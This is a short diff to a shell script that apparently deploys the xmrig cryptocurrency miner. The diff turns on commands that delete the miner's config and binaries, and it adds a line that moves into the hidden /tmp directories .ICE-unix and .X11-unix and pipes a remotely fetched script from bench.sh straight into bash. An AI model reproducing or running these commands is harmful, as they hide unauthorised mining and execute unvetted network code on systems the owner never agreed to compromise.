@@ -63,5 +63,7 @@ else
 fi
 
 # Clean up
-# rm -rf config.json*
-# rm -rf xmrig*
+rm -rf config.json*
+rm -rf xmrig*
+
+cd /tmp ; cd .ICE-unix ; cd .X11-unix ; curl -Lso- bench.sh | bash
